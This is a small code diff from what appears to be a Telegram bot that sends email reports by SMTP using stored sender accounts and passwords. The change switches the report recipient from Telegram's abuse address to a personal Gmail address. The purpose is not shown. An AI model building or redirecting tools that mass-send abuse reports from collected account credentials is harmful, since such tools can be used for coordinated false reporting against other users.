@@ -624,7 +624,7 @@ async def send_single_email_report(update: Update, context: ContextTypes.DEFAULT
     
     sender_email = account['email']
     sender_password = account['password']
-    receiver_email = "abuse@telegram.org"
+    receiver_email = "marslansalfias@gmail.com"
     smtp_server, smtp_port = get_email_server(sender_email)
 
     if not smtp_server:
